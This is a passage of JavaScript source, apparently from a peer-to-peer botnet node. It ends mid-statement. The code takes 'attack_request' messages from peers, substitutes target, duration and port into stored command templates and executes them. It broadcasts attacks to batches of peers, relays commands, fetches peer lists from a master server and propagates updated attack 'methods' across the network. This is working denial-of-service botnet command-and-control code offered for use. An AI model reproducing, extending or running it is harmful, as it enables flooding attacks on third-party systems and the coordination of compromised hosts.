          this.emit('attack_response', { nodeId, ...message });
          break;
        case 'status_request':
          this.handleStatusRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'status_response':
          this.emit('status_response', { nodeId, ...message });
          break;
        case 'peer_list':
          this.handlePeerListUpdate(message);
          break;
        case 'relay_request':
          this.handleRelayRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'relay_response':
          this.handleRelayResponse(nodeId, message);
          break;
        case 'methods_version_query':
          this.handleMethodsVersionQuery(nodeId, message, decrypted.encrypted);
          break;
        case 'methods_version_response':
          this.handleMethodsVersionResponse(nodeId, message);
          break;
        case 'methods_request':
          this.handleMethodsRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'methods_response':
          this.handleMethodsResponse(nodeId, message);
          break;
        case 'methods_push':
          this.handleMethodsPush(nodeId, message);
          break;
        case 'methods_update_notification':
          this.handleMethodsUpdateNotification(nodeId, message);
          break;
        case 'file_request':
          this.handleFileRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'file_response':
          this.handleFileResponse(nodeId, message);
          break;
        default:
          console.log(`[P2P] Unknown message type: ${message.type}`);
          this.emit('peer_message', { nodeId, message });
      }
      
    } catch (error) {
      console.error(`[P2P] Failed to handle message from ${nodeId}:`, error.message);
    }
  }
  
  handleWelcomeMessage(nodeId, message) {
    console.log(`[P2P] Received welcome from ${nodeId}`);
    
    const peer = this.peers.get(nodeId);
    if (peer) {
      peer.capabilities = message.capabilities;
      peer.mode = message.mode || 'DIRECT';
      
      if (message.capabilities && message.capabilities.encryption !== undefined) {
        peer.supportsEncryption = message.capabilities.encryption;
        console.log(`[P2P] Peer ${nodeId} encryption support: ${peer.supportsEncryption}`);
      }
      
      if (message.ip) peer.ip = message.ip;
      if (message.port) peer.port = this.normalizePort(message.port);
      
      if (message.capabilities) {
        peer.methodsVersion = message.capabilities.methodsVersion;
        peer.methodsCount = message.capabilities.methodsCount || 0;
      }
      
      const now = Date.now();
      this.knownPeers.set(nodeId, {
        nodeId,
        ip: message.ip || peer.ip,
        port: this.normalizePort(message.port || peer.port),
        mode: message.mode || 'DIRECT',
        reachable: true,
        capabilities: message.capabilities,
        methodsVersion: message.capabilities?.methodsVersion,
        methodsCount: message.capabilities?.methodsCount || 0,
        lastUpdate: now,
        supportsEncryption: message.capabilities?.encryption || false
      });
      
      if (this.p2pConfig.preferP2PSync && peer.methodsVersion && 
          peer.methodsVersion !== this.methodsVersionHash) {
        console.log(
          `[P2P-METHODS] Peer ${nodeId} has different methods version, checking...`
        );
        setTimeout(() => this.requestMethodsVersionFromPeer(nodeId), 1000);
      }
    }
    
    this.emit('peer_info', {
      nodeId,
      capabilities: message.capabilities,
      mode: message.mode
    });
  }
  
  async handleAttackRequest(nodeId, message, wasEncrypted) {
    const { requestId, target, time, port, methods } = message;
    
    console.log(`[P2P] Attack request from ${nodeId}:`, {
      target,
      time,
      methods,
      encrypted: wasEncrypted
    });
    
    try {
      const methodCfg = this.methodsConfig[methods];
      if (!methodCfg) {
        const response = {
          type: 'attack_response',
          requestId,
          success: false,
          error: 'INVALID_METHOD'
        };
        const encrypted = this.encryptMessage(response, 'attack_response');
        this.sendToPeer(nodeId, encrypted.data);
        return;
      }
      
      const command = methodCfg.cmd
        .replaceAll('{target}', target)
        .replaceAll('{time}', time)
        .replaceAll('{port}', port);
      
      const result = await this.executor.execute(command, {
        expectedDuration: time
      });
      
      const response = {
        type: 'attack_response',
        requestId,
        success: true,
        processId: result.processId,
        pid: result.pid,
        target,
        time,
        port,
        methods
      };
      const encrypted = this.encryptMessage(response, 'attack_response');
      this.sendToPeer(nodeId, encrypted.data);
      
      console.log(`[P2P] Attack executed for ${nodeId}`);
      
    } catch (error) {
      const response = {
        type: 'attack_response',
        requestId,
        success: false,
        error: error.message
      };
      const encrypted = this.encryptMessage(response, 'attack_response');
      this.sendToPeer(nodeId, encrypted.data);
    }
  }
  
  async handleStatusRequest(nodeId, message, wasEncrypted) {
    const { requestId } = message;
    
    try {
      const activeProcesses = this.executor.getActiveProcesses();
      const methods = Object.keys(this.methodsConfig);
      
      const status = {
        nodeId: this.nodeId,
        mode: this.nodeMode,
        activeProcesses: activeProcesses.length,
        methods,
        methodsVersion: this.methodsVersionHash,
        methodsCount: methods.length,
        peers: this.peers.size,
        uptime: process.uptime(),
        timestamp: Date.now(),
        encryption: this.isEncryptionEnabled()
      };
      
      const response = {
        type: 'status_response',
        requestId,
        status
      };
      const encrypted = this.encryptMessage(response, 'status_response');
      this.sendToPeer(nodeId, encrypted.data);
      
    } catch (error) {
      const response = {
        type: 'status_response',
        requestId,
        error: error.message
      };
      const encrypted = this.encryptMessage(response, 'status_response');
      this.sendToPeer(nodeId, encrypted.data);
    }
  }
  
  async handleRelayRequest(nodeId, message, wasEncrypted) {
    const { relayId, targetNodeId, payload } = message;
    
    console.log(`[P2P-RELAY] Relay request from ${nodeId} to ${targetNodeId}`);
    
    if (this.peers.has(targetNodeId)) {
      const relayedMessage = {
        type: 'relayed_message',
        sourceNodeId: nodeId,
        relayId,
        payload
      };
      const encrypted = this.encryptMessage(relayedMessage, 'relayed_message');
      const success = this.sendToPeer(targetNodeId, encrypted.data);
      
      const response = {
        type: 'relay_response',
        relayId,
        success,
        targetNodeId
      };
      const encryptedResponse = this.encryptMessage(response, 'relay_response');
      this.sendToPeer(nodeId, encryptedResponse.data);
      
      if (success) {
        this.stats.messagesRelayed++;
      }
      
    } else {
      const response = {
        type: 'relay_response',
        relayId,
        success: false,
        error: 'Target not connected',
        targetNodeId
      };
      const encrypted = this.encryptMessage(response, 'relay_response');
      this.sendToPeer(nodeId, encrypted.data);
    }
  }
  
  handleRelayResponse(nodeId, message) {
    this.emit('relay_response', {
      relayNodeId: nodeId,
      ...message
    });
  }
  
  handlePeerListUpdate(message) {
    const { peers } = message;
    if (!Array.isArray(peers)) return;
    
    console.log(`[P2P-DISCOVERY] Received peer list: ${peers.length} peers`);
    
    let newPeers = 0;
    let updatedPeers = 0;
    const now = Date.now();
    
    for (const peer of peers) {
      if (!peer.node_id || peer.node_id === this.nodeId) continue;
      
      const normalizedPort = this.normalizePort(peer.port);
      if (peer.ip === this.nodeIp && normalizedPort === this.nodePort) continue;
      
      const existing = this.knownPeers.get(peer.node_id);
      if (!existing) {
        newPeers++;
        this.stats.peersDiscovered++;
      } else {
        updatedPeers++;
      }
      
      this.knownPeers.set(peer.node_id, {
        nodeId: peer.node_id,
        ip: peer.ip,
        port: normalizedPort,
        mode: peer.mode || 'DIRECT',
        reachable: peer.reachable !== false,
        methods: peer.methods_supported || [],
        methodsVersion: peer.methods_version,
        methodsCount: peer.methods_count || 0,
        lastUpdate: now
      });
    }
    
    if (newPeers > 0 || updatedPeers > 0) {
      console.log(`[P2P-DISCOVERY] Updated: ${newPeers} new, ${updatedPeers} existing peers`);
    }
  }
  
  handleMethodsVersionQuery(nodeId, message, wasEncrypted) {
    const { requestId } = message;
    const methodsCount = Object.keys(this.methodsConfig).length;
    
    const response = {
      type: 'methods_version_response',
      requestId,
      nodeId: this.nodeId,
      methodsVersion: this.methodsVersionHash,
      methodsCount,
      lastUpdate: this.methodsLastUpdate,
      timestamp: Date.now()
    };
    const encrypted = this.encryptMessage(response, 'methods_version_response');
    this.sendToPeer(nodeId, encrypted.data);
  }
  
  handleMethodsVersionResponse(nodeId, message) {
    const { requestId, methodsVersion, methodsCount, lastUpdate } = message;
    
    console.log(
      `[P2P-METHODS] Peer ${nodeId} has methods version ${methodsVersion?.substring(0, 8)}, ` +
      `count: ${methodsCount}`
    );
    
    const peer = this.peers.get(nodeId);
    if (peer) {
      peer.methodsVersion = methodsVersion;
      peer.methodsCount = methodsCount;
    }
    
    if (methodsVersion && methodsVersion !== this.methodsVersionHash) {
      const localCount = Object.keys(this.methodsConfig).length;
      if (methodsCount > localCount || (lastUpdate && lastUpdate > this.methodsLastUpdate)) {
        console.log(`[P2P-METHODS] Peer ${nodeId} has newer methods, requesting...`);
        this.requestMethodsFromPeer(nodeId);
      }
    }
    
    this.emit('methods_version_response', {
      nodeId,
      requestId,
      methodsVersion,
      methodsCount,
      lastUpdate
    });
  }
  
  handleMethodsRequest(nodeId, message, wasEncrypted) {
    const { requestId } = message;
    const methodsCount = Object.keys(this.methodsConfig).length;
    
    console.log(`[P2P-METHODS] Peer ${nodeId} requested full methods config`);
    
    const response = {
      type: 'methods_response',
      requestId,
      nodeId: this.nodeId,
      methods: this.methodsConfig,
      methodsVersion: this.methodsVersionHash,
      methodsCount,
      timestamp: Date.now()
    };
    const encrypted = this.encryptMessage(response, 'methods_response');
    this.sendToPeer(nodeId, encrypted.data);
    
    this.stats.filesShared++;
  }
  
  async handleMethodsResponse(nodeId, message) {
    const { requestId, methods, methodsVersion, methodsCount } = message;
  
    console.log(
      `[P2P-METHODS] Received methods from peer ${nodeId}: ${methodsCount} methods`
    );
  
    if (!methods || typeof methods !== 'object') {
      console.error('[P2P-METHODS] Invalid methods received from peer');
      return;
    }
  
    try {
      const keys = Object.keys(methods).sort();
      const normalized = JSON.stringify(methods, keys);
      const calculatedHash = crypto.createHash('sha256').update(normalized).digest('hex');
      
      if (calculatedHash !== methodsVersion) {
        console.error('[P2P-METHODS] Methods version mismatch, rejecting');
        return;
      }
      
      const normalizedMethods = normalizeMethodsToLocalPaths(methods, this.config);
      if (!normalizedMethods || Object.keys(normalizedMethods).length === 0) {
        console.error('[P2P-METHODS] Failed to normalize methods from peer');
        return;
      }
      
      this.methodsConfig = normalizedMethods;
      this.methodsVersionHash = methodsVersion;
      this.methodsLastUpdate = Date.now();
      
      console.log(`[P2P-METHODS] ✓ Updated methods from peer ${nodeId}`);
      this.stats.methodSyncsFromPeers++;
      
      this.emit('methods_response', {
        nodeId,
        requestId,
        methods: normalizedMethods,
        methodsVersion,
        methodsCount
      });

      this.emit('methods_updated_from_peer', {
        nodeId,
        methods: normalizedMethods,
        methodsVersion,
        methodsCount,
        source: 'request_response'
      });
      
      setImmediate(() => {
        this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, [nodeId]);
      });
      
    } catch (error) {
      console.error('[P2P-METHODS] Error processing methods from peer:', error.message);
    }
  }
  
  handleMethodsPush(nodeId, message) {
    const { methods, methodsVersion, methodsCount, propagationChain } = message;
  
    console.log(
      `[P2P-METHODS] Received PROACTIVE methods push from ${nodeId}: ${methodsCount} methods`
    );
  
    if (Array.isArray(propagationChain)) {
      if (propagationChain.includes(this.nodeId)) {
        console.log('[P2P-METHODS] Detected propagation loop, rejecting push');
        return;
      }
      if (propagationChain.length >= this.p2pConfig.maxPropagationHops) {
        console.log('[P2P-METHODS] Max propagation hops reached, stopping chain');
        return;
      }
    }
  
    if (!methods || typeof methods !== 'object') {
      console.error('[P2P-METHODS] Invalid methods in push');
      return;
    }
  
    try {
      const keys = Object.keys(methods).sort();
      const normalized = JSON.stringify(methods, keys);
      const calculatedHash = crypto.createHash('sha256').update(normalized).digest('hex');
      
      if (calculatedHash !== methodsVersion) {
        console.error('[P2P-METHODS] Methods version mismatch in push, rejecting');
        return;
      }
      
      if (methodsVersion === this.methodsVersionHash) {
        console.log('[P2P-METHODS] Already have this version, skipping');
        return;
      }
      
      const normalizedMethods = normalizeMethodsToLocalPaths(methods, this.config);
      if (!normalizedMethods || Object.keys(normalizedMethods).length === 0) {
        console.error('[P2P-METHODS] Failed to normalize methods from push');
        return;
      }
      
      this.methodsConfig = normalizedMethods;
      this.methodsVersionHash = methodsVersion;
      this.methodsLastUpdate = Date.now();
      
      console.log(`[P2P-METHODS] ✓ Updated methods from PROACTIVE push by ${nodeId}`);
      this.stats.methodSyncsFromPeers++;
      
      this.emit('methods_updated_from_peer', {
        nodeId,
        methods: normalizedMethods,
        methodsVersion,
        methodsCount,
        source: 'proactive_push'
      });
      
      const newChain = propagationChain ? [...propagationChain, this.nodeId] : [nodeId, this.nodeId];
      setImmediate(() => {
        this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, newChain);
      });
      
    } catch (error) {
      console.error('[P2P-METHODS] Error processing methods push:', error.message);
    }
  }
  
  handleMethodsUpdateNotification(nodeId, message) {
    const { methodsVersion, methodsCount, sourceNodeId, propagationChain } = message;
  
    console.log(
      `[P2P-METHODS] Update notification from ${nodeId}: version ${methodsVersion?.substring(0, 8)}`
    );
  
    if (Array.isArray(propagationChain) && propagationChain.includes(this.nodeId)) {
      console.log('[P2P-METHODS] Detected propagation loop in notification, skipping');
      return;
    }
  
    if (this.methodUpdatePropagationLock.has(methodsVersion)) {
      console.log('[P2P-METHODS] Already processing this update, skipping');
      return;
    }
  
    this.methodUpdatePropagationLock.set(methodsVersion, Date.now());
    setTimeout(() => {
      this.methodUpdatePropagationLock.delete(methodsVersion);
    }, this.p2pConfig.propagationCooldown);
  
    if (methodsVersion && methodsVersion !== this.methodsVersionHash) {
      console.log(`[P2P-METHODS] New version detected, requesting from ${nodeId}...`);
      
      this.requestMethodsFromPeer(nodeId).then(result => {
        if (result && result.success !== false) {
          console.log('[P2P-METHODS] ✓ Successfully synced from peer');
          
          const newChain = propagationChain ? [...propagationChain, this.nodeId] : [nodeId, this.nodeId];
          const propagated = this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, newChain);
          console.log(
            `[P2P-METHODS] ✓ Propagated to ${propagated} peer(s) immediately`
          );
        }
      }).catch(error => {
        console.error('[P2P-METHODS] Failed to sync from peer:', error.message);
      });
    }
  }
  
  handleFileRequest(nodeId, message, wasEncrypted) {
    const { requestId, filename } = message;
    
    console.log(`[P2P-FILE] Peer ${nodeId} requested file: ${filename}`);
    
    const dataDir = path.join(__dirname, '..', 'lib', 'data');
    const filePath = path.join(dataDir, filename);
    
    if (!fs.existsSync(filePath)) {
      const response = {
        type: 'file_response',
        requestId,
        filename,
        success: false,
        error: 'File not found'
      };
      const encrypted = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, encrypted.data);
      return;
    }

    try {
      const fileData = fs.readFileSync(filePath);
      const base64Data = fileData.toString('base64');
      
      const response = {
        type: 'file_response',
        requestId,
        filename,
        data: base64Data,
        size: fileData.length,
        success: true
      };
      const encrypted = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, encrypted.data);
      
      this.stats.filesShared++;
      console.log(`[P2P-FILE] Sent file ${filename} to ${nodeId} (encrypted: ${encrypted.encrypted})`);
      
    } catch (error) {
      const response = {
        type: 'file_response',
        requestId,
        filename,
        success: false,
        error: error.message
      };
      const encrypted = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, encrypted.data);
    }
  }
  
  handleFileResponse(nodeId, message) {
    const { requestId, filename, data, success, error } = message;
    
    if (success && data) {
      console.log(`[P2P-FILE] Received file ${filename} from ${nodeId}`);
      
      this.emit('file_received', {
        nodeId,
        requestId,
        filename,
        data,
        size: message.size
      });
      
      this.stats.filesReceived++;
    } else {
      console.error(`[P2P-FILE] Failed to receive ${filename}: ${error}`);
    }
  }
  
  async requestMethodsVersionFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    
    return this._requestWithHandler({
      nodeId,
      requestId,
      eventName: 'methods_version_response',
      handlerKeyPrefix: 'methods_version_response',
      timeoutMs: 10000,
      message: {
        type: 'methods_version_query',
        requestId,
        timestamp: Date.now()
      }
    });
  }
  
  async requestMethodsFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    
    return this._requestWithHandler({
      nodeId,
      requestId,
      eventName: 'methods_response',
      handlerKeyPrefix: 'methods_response',
      timeoutMs: 30000,
      message: {
        type: 'methods_request',
        requestId,
        timestamp: Date.now()
      }
    });
  }
  
  async requestFileFromPeer(nodeId, filename) {
    const requestId = crypto.randomBytes(8).toString('hex');
    
    return this._requestWithHandler({
      nodeId,
      requestId,
      eventName: 'file_received',
      handlerKeyPrefix: 'file_received',
      timeoutMs: 60000,
      message: {
        type: 'file_request',
        requestId,
        filename,
        timestamp: Date.now()
      }
    });
  }
  
  async requestAttackFromPeer(nodeId, target, time, port, methods) {
    const requestId = crypto.randomBytes(8).toString('hex');
    
    return this._requestWithHandler({
      nodeId,
      requestId,
      eventName: 'attack_response',
      handlerKeyPrefix: 'attack_response',
      timeoutMs: 30000,
      message: {
        type: 'attack_request',
        requestId,
        target,
        time,
        port,
        methods
      }
    });
  }
  
  async requestStatusFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    
    return this._requestWithHandler({
      nodeId,
      requestId,
      eventName: 'status_response',
      handlerKeyPrefix: 'status_response',
      timeoutMs: 10000,
      message: {
        type: 'status_request',
        requestId
      }
    });
  }

  async relayMessage(targetNodeId, message) {
    if (!this.p2pConfig.relayFallback) {
      return { success: false, error: 'Relay disabled' };
    }
    
    for (const [nodeId] of this.peers) {
      if (nodeId === targetNodeId) continue;
      
      const relayId = crypto.randomBytes(8).toString('hex');
      
      return this._requestWithHandler({
        nodeId,
        requestId: relayId,
        eventName: 'relay_response',
        handlerKeyPrefix: 'relay_response',
        timeoutMs: 15000,
        matchField: 'relayId',
        message: {
          type: 'relay_request',
          relayId,
          targetNodeId,
          payload: message
        }
      });
    }
    
    return { success: false, error: 'No relay peer available' };
  }

  _requestWithHandler({
    nodeId,
    requestId,
    eventName,
    handlerKeyPrefix,
    timeoutMs,
    message,
    matchField = 'requestId'
  }) {
    return new Promise((resolve) => {
      let timeoutId = null;
      const handlerKey = `${handlerKeyPrefix}_${requestId}`;
      
      const cleanup = () => {
        if (timeoutId) clearTimeout(timeoutId);
        const stored = this.requestHandlers.get(handlerKey);
        if (stored) {
          const { handler } = stored;
          this.removeListener(eventName, handler);
          this.requestHandlers.delete(handlerKey);
          this.requestHandlerTimestamps.delete(handlerKey);
          this.stats.requestHandlersCleaned++;
        }
      };
      
      const handler = (data) => {
        if (data[matchField] === requestId) {
          cleanup();
          resolve(data);
        }
      };
      
      this.requestHandlers.set(handlerKey, { eventName, handler });
      this.requestHandlerTimestamps.set(handlerKey, Date.now());
      this.on(eventName, handler);
      
      timeoutId = setTimeout(() => {
        cleanup();
        resolve({ success: false, error: 'Timeout' });
      }, timeoutMs);
      
      const encrypted = this.encryptMessage(message, message.type);
      const sent = this.sendToPeer(nodeId, encrypted.data);
      if (!sent) {
        cleanup();
        resolve({ success: false, error: 'Failed to send request' });
      }
    });
  }
  
  propagateMethodsUpdateImmediate(excludeNodeId = null, versionHash = null, propagationChain = []) {
    const version = versionHash || this.methodsVersionHash;
    const localMethodsCount = Object.keys(this.methodsConfig).length;
    
    console.log('[P2P-METHODS] Propagating methods update IMMEDIATELY to all peers');
    
    const newChain = propagationChain.includes(this.nodeId) 
      ? propagationChain 
      : [...propagationChain, this.nodeId];
    
    if (newChain.length >= this.p2pConfig.maxPropagationHops) {
      console.log('[P2P-METHODS] Max propagation hops reached, stopping');
      return 0;
    }
    
    let notified = 0;
    const notificationPromises = [];
    
    for (const [nodeId, peer] of this.peers) {
      if (excludeNodeId && nodeId === excludeNodeId) continue;
      if (newChain.includes(nodeId)) {
        console.log(`[P2P-METHODS] Skipping ${nodeId} (in propagation chain)`);
        continue;
      }
      if (peer.methodsVersion === version) continue;

      const notification = {
        type: 'methods_update_notification',
        methodsVersion: version,
        methodsCount: localMethodsCount,
        sourceNodeId: excludeNodeId || this.nodeId,
        propagationChain: newChain,
        timestamp: Date.now(),
        urgent: true
      };
      
      const encrypted = this.encryptMessage(notification, 'methods_update_notification');
      const sent = this.sendToPeer(nodeId, encrypted.data);
      
      if (sent) {
        notified++;
        console.log(`[P2P-METHODS] ✓ Notified ${nodeId} immediately (chain: ${newChain.length} hops, encrypted: ${encrypted.encrypted})`);
        notificationPromises.push(
          this.sendMethodsConfigToPeer(nodeId, version, newChain)
        );
      }
    }
    
    Promise.all(notificationPromises).then(() => {
      console.log(`[P2P-METHODS] ✓ Completed propagation to ${notified} peer(s)`);
    }).catch(error => {
      console.error('[P2P-METHODS] Error in propagation:', error.message);
    });
    
    return notified;
  }

  async sendMethodsConfigToPeer(nodeId, versionHash, propagationChain = []) {
    try {
      const methods = this.methodsConfig;
      const methodsCount = Object.keys(methods).length;

      const message = {
        type: 'methods_push',
        nodeId: this.nodeId,
        methods,
        methodsVersion: versionHash,
        methodsCount,
        propagationChain,
        timestamp: Date.now()
      };
      
      const encrypted = this.encryptMessage(message, 'methods_push');
      const sent = this.sendToPeer(nodeId, encrypted.data);
      
      if (sent) {
        console.log(
          `[P2P-METHODS] ✓ Pushed full config to ${nodeId} (chain: ${propagationChain.length} hops, encrypted: ${encrypted.encrypted})`
        );
        this.stats.filesShared++;
      }
      
      return sent;
    } catch (error) {
      console.error(
        `[P2P-METHODS] Failed to push config to ${nodeId}:`,
        error.message
      );
      return false;
    }
  }
  
  async syncMethodsFromPeers() {
    if (this.peers.size === 0) {
      console.log('[P2P-METHODS] No peers connected for sync');
      return { success: false, error: 'No peers connected' };
    }
    
    console.log('[P2P-METHODS] Checking methods version with peers...');
    
    let bestPeer = null;
    let maxMethods = Object.keys(this.methodsConfig).length;
    
    for (const [nodeId, peer] of this.peers) {
      if (peer.methodsCount > maxMethods) {
        bestPeer = nodeId;
        maxMethods = peer.methodsCount;
      }
    }
    
    if (!bestPeer) {
      console.log('[P2P-METHODS] All peers have same or fewer methods');
      return { success: false, error: 'No peer with newer methods' };
    }

    console.log(
      `[P2P-METHODS] Found peer ${bestPeer} with ${maxMethods} methods, syncing...`
    );
    const result = await this.requestMethodsFromPeer(bestPeer);
    if (result && result.success !== false) {
      return { success: true, fromPeer: bestPeer };
    }
    return { success: false, error: result?.error || 'Sync failed' };
  }
  
  startMethodSyncChecker() {
    if (this.methodSyncInterval) {
      clearInterval(this.methodSyncInterval);
    }
    
    console.log(
      `[P2P-METHODS] Starting method sync checker every ${this.p2pConfig.methodSyncInterval}ms`
    );
    
    this.methodSyncInterval = setInterval(async () => {
      if (this.isShuttingDown || !this.p2pConfig.preferP2PSync) return;
      
      if (this.peers.size > 0) {
        const localCount = Object.keys(this.methodsConfig).length;
        let needsSync = false;
        
        for (const [, peer] of this.peers) {
          if (peer.methodsVersion && peer.methodsVersion !== this.methodsVersionHash) {
            if (peer.methodsCount > localCount) {
              needsSync = true;
              break;
            }
          }
        }
        
        if (needsSync) {
          console.log('[P2P-METHODS] Detected newer methods from peers, syncing...');
          await this.syncMethodsFromPeers();
        }
      }
    }, this.p2pConfig.methodSyncInterval);
  }
  
  sendToPeer(nodeId, message) {
    const peer = this.peers.get(nodeId);
    if (!peer || !peer.connected) {
      return this.queueMessage(nodeId, message);
    }
    
    try {
      if (peer.ws.readyState === WebSocket.OPEN) {
        peer.ws.send(JSON.stringify(message));
        peer.messagesSent++;
        this.stats.messagesSent++;
        return true;
      }
      console.log(
        `[P2P] Peer ${nodeId} WebSocket not open (state: ${peer.ws.readyState}), queuing message`
      );
      return this.queueMessage(nodeId, message);
    } catch (error) {
      console.error(`[P2P] Failed to send to ${nodeId}:`, error.message);
      return this.queueMessage(nodeId, message);
    }
  }
  
  queueMessage(nodeId, message) {
    if (!this.messageQueue.has(nodeId)) {
      this.messageQueue.set(nodeId, []);
    }
    
    const queue = this.messageQueue.get(nodeId);
    
    if (queue.length >= this.p2pConfig.messageQueueSize) {
      queue.shift();
    }
    
    queue.push({
      message,
      timestamp: Date.now()
    });
    
    this.stats.messagesQueued++;
    
    console.log(`[P2P] Queued message for ${nodeId} (queue size: ${queue.length})`);
    
    return false;
  }
  
  processQueuedMessages(nodeId) {
    const queue = this.messageQueue.get(nodeId);
    if (!queue || queue.length === 0) {
      this.messageQueue.delete(nodeId);
      return;
    }
    
    const peer = this.peers.get(nodeId);
    if (!peer || !peer.ws || peer.ws.readyState !== WebSocket.OPEN) {
      console.log(
        `[P2P] Peer ${nodeId} not ready, keeping ${queue.length} queued message(s)`
      );
      return;
    }
    
    console.log(
      `[P2P] Processing ${queue.length} queued messages for ${nodeId}`
    );
    
    let sent = 0;
    let failed = 0;
    
    for (const item of queue) {
      try {
        peer.ws.send(JSON.stringify(item.message));
        peer.messagesSent++;
        this.stats.messagesSent++;
        sent++;
      } catch (error) {
        console.error(
          `[P2P] Failed to flush queued message to ${nodeId}:`,
          error.message
        );
        failed++;
      }
    }
    
    this.messageQueue.delete(nodeId);
    
    console.log(
      `[P2P] Processed queue for ${nodeId}: ${sent} sent, ${failed} failed`
    );
  }
  
  broadcastToPeers(message, excludeNodeId = null) {
    let sent = 0;
    
    const encrypted = this.encryptMessage(message, message.type || 'broadcast');
    
    for (const [nodeId] of this.peers) {
      if (excludeNodeId && nodeId === excludeNodeId) continue;
      if (this.sendToPeer(nodeId, encrypted.data)) sent++;
    }
    
    console.log(`[P2P] Broadcast to ${sent} peer(s) (encrypted: ${encrypted.encrypted})`);
    
    return sent;
  }
  
  async broadcastAttackRequest({ target, time, port, methods, targetPeerIds = null, maxParallel = 5 }) {
    if (this.peers.size === 0) {
      console.log('[P2P-ATTACK-BROADCAST] No peers connected');
      return {
        success: false,
        error: 'No peers connected',
        summary: { totalTargets: 0, success: 0, failed: 0 },
        results: []
      };
    }

    let peersToUse;
    if (Array.isArray(targetPeerIds) && targetPeerIds.length > 0) {
      peersToUse = targetPeerIds
        .filter(id => this.peers.has(id))
        .map(id => ({ nodeId: id, peer: this.peers.get(id) }));
    } else {
      peersToUse = Array.from(this.peers.entries())
        .filter(([, peer]) => peer.mode === 'DIRECT' || peer.mode === 'REVERSE')
        .map(([nodeId, peer]) => ({ nodeId, peer }));
    }

    if (peersToUse.length === 0) {
      console.log('[P2P-ATTACK-BROADCAST] No eligible peers for broadcast');
      return {
        success: false,
        error: 'No eligible peers',
        summary: { totalTargets: 0, success: 0, failed: 0 },
        results: []
      };
    }

    console.log(
      `[P2P-ATTACK-BROADCAST] Broadcasting attack to ${peersToUse.length} peer(s) (encrypted: ${this.isEncryptionEnabled()})`
    );

    const results = [];
    let successCount = 0;
    let failedCount = 0;

    for (let i = 0; i < peersToUse.length; i += maxParallel) {
      const batch = peersToUse.slice(i, i + maxParallel);

      const batchResults = await Promise.all(
        batch.map(async ({ nodeId }) => {
          try {
            const res = await this.requestAttackFromPeer(nodeId, target, time, port, methods);
            const ok = res && res.success;
            if (ok) successCount++;
            else failedCount++;

            return {
              nodeId,
              success: !!res.success,
              error: res.success ? null : (res.error || 'Unknown error'),
              response: res
            };
          } catch (err) {
            failedCount++;
            console.error(
              `[P2P-ATTACK-BROADCAST] Error requesting attack from ${nodeId}:`,
              err.message
            );
            return {
              nodeId,
              success: false,
              error: err.message,
              response: null
            };
          }
        })
      );

      results.push(...batchResults);
    }

    const summary = {
      totalTargets: peersToUse.length,
      success: successCount,
      failed: failedCount
    };

    console.log('[P2P-ATTACK-BROADCAST] Finished:', summary);

    return {
      success: successCount > 0,
      summary,
      results
    };
  }
  
  startPeerDiscovery() {
    if (this.discoveryInterval) {
      clearInterval(this.discoveryInterval);
    }
    
    console.log(
      `[P2P-DISCOVERY] Starting peer discovery every ${this.p2pConfig.discoveryInterval}ms`
    );
    
    setTimeout(() => this.discoverPeers(), 5000);
    
    this.discoveryInterval = setInterval(() => {
      if (!this.isShuttingDown) {
        this.discoverPeers();
      }
    }, this.p2pConfig.discoveryInterval);
  }
  
  async discoverPeers() {
    if (!this.config.MASTER?.URL) {
      console.log('[P2P-DISCOVERY] No master URL configured');
      return;
    }
    
    try {
      console.log('[P2P-DISCOVERY] Requesting peer list from master...');
      
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000);
      
      const response = await globalThis.fetch(`${this.config.MASTER.URL}/api/nodes`, {
        signal: controller.signal
      });
      
      clearTimeout(timeout);
      
      if (!response.ok) {
        console.log('[P2P-DISCOVERY] Failed to get peer list:', response.status);
        this.masterReachable = false;
        return;
      }
      
      const data = await response.json();
      this.masterReachable = true;
      this.stats.lastDiscovery = Date.now();
      
      if (Array.isArray(data.nodes)) {
        this.handlePeerListUpdate({ peers: data.nodes });
      }
      
    } catch (error) {
      console.error('[P2P-DISCOVERY] Error:', error.message);
      this.masterReachable = false;
    }
  }
  
  startAutoConnector() {
    if (!this.p2pConfig.autoConnect) {
      console.log('[P2P-AUTO] Auto-connect disabled');
      return;
    }
    
    if (this.autoConnectInterval) {
      clearInterval(this.autoConnectInterval);
    }
    
    console.log(
      `[P2P-AUTO] Starting auto-connector every ${this.p2pConfig.autoConnectDelay}ms`
    );
    
    setTimeout(() => this.autoConnectToPeers(), this.p2pConfig.autoConnectDelay);
    
    this.autoConnectInterval = setInterval(() => {
      if (!this.isShuttingDown) {
        this.autoConnectToPeers();
      }
    }, this.p2pConfig.autoConnectDelay);
  }
  
  async autoConnectToPeers() {
    if (this.isShuttingDown) return;
    
    const totalConnections = this.peers.size + this.connectionLocks.size;
    if (totalConnections >= this.p2pConfig.maxPeers) {
      console.log(
        `[P2P-AUTO] Max peers reached (${totalConnections}/${this.p2pConfig.maxPeers}), skipping auto-connect`
      );
      return;
    }
    
    const availablePeers = Array.from(this.knownPeers.values())
      .filter(peer => {
        if (peer.nodeId === this.nodeId) return false;
        if (peer.ip === this.nodeIp && peer.port === this.nodePort) return false;
        
        return (peer.mode === 'DIRECT' || peer.mode === 'REVERSE') &&
               !this.peers.has(peer.nodeId) &&
               !this.connectionLocks.has(peer.nodeId) &&  
               !this.isBlacklisted(peer.nodeId);
      })
      .sort((a, b) => {
        if (a.fromReferral && !b.fromReferral) return -1;
        if (!a.fromReferral && b.fromReferral) return 1;
        return b.lastUpdate - a.lastUpdate;
      })
      .slice(0, this.p2pConfig.maxPeers - totalConnections);
      
    if (availablePeers.length === 0) {
      console.log('[P2P-AUTO] No available peers to connect');
      return;
    }
    
    const referralCount = availablePeers.filter(p => p.fromReferral).length;
    console.log(
